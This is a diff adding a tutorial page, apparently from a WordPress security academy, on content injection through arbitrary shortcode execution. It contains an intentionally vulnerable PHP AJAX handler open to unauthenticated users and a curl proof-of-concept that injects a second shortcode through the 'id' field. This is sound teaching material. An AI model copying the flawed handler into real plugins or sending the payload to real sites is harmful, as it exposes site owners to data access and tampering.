@@ -1,0 +1,49 @@
+---
+title: Content Injection
+head:
+    - tag: title
+      content: Learn about Content Injection
+contributors:
+    - dhakalananda
+---
+
+import { LinkCard } from '@astrojs/starlight/components';
+
+
+## Introduction
+
+This article covers cases of possible Content Injection on WordPress. This includes improper input handling inside of the plugin/theme which can be used to inject or manipulate untrusted content displayed to other users without proper sanitization or validation.
+
+<LinkCard
+  title="Learn how to secure your code against Content Injection"
+  href="/academy/wordpress/securing-code/content-injection/"
+/>
+
+## Arbitrary Shortcode Exection
+
+One of the most common cases of content injection in WordPress - Arbitrary Shortcode Execution. It results due to the lack of user-input sanitization while rendering the dynamic shortcode. It can lead to access to sensitive data or modification of data with proper privilege if other shortcodes are available for abuse.
+
+Below is an example of vulnerable code:
+
+```php
+add_action('wp_ajax_load_shortcode_content', 'my_ajax_load_shortcode');
+add_action('wp_ajax_nopriv_load_shortcode_content', 'my_ajax_load_shortcode');
+
+function my_ajax_load_shortcode() {
+    $id = $_POST['id'];
+
+    $shortcode_output = do_shortcode('[my_custom_shortcode id="' . $id . '"]');
+
+    echo $shortcode_output;
+
+    wp_die();
+}
+```
+
+In the above code, an attacker can input arbitrary `$id` value to close the original shortcode and execute arbitrary shortcode of their choice.
+
+To exploit this, any unauthenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint specifying the needed parameter to trigger the `my_ajax_load_shortcode` function.
+
+```bash
+curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=load_shortcode_content -d 'id=1"][arbitrary_shortcode=1]'
+```
